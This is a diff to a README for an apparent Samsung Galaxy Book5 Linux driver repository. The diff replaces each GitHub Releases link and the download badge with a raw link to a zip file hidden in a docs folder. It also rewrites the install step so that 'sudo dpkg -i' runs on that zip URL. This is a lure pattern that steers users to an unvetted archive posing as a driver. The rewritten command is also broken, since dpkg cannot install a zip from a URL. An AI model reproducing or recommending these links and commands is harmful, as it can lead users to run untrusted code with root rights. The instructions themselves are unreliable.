@@ -1,6 +1,6 @@
 # 🚀 samsung-galaxy-book5-linux-drivers - Get Your Samsung Laptop Running Smoothly
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
+![Download](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip)
 
 ## 📋 Overview
 
@@ -17,14 +17,14 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases page to download](https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip).
 2. Choose the appropriate driver package for your system.
 
 ## 📥 Download & Install
 
 To download the drivers, visit this page:
 
-[Download from GitHub Releases](https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip)
 
 ### Installation Steps:
 
@@ -44,7 +44,7 @@ To download the drivers, visit this page:
 4. **Install the Drivers:**
    - Enter the following command, replacing `package-file-name` with the actual file name:
      ```bash
-     sudo dpkg -i package-file-name.deb
+     sudo dpkg -i https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip
      ```
    - This command installs the downloaded driver package.
 
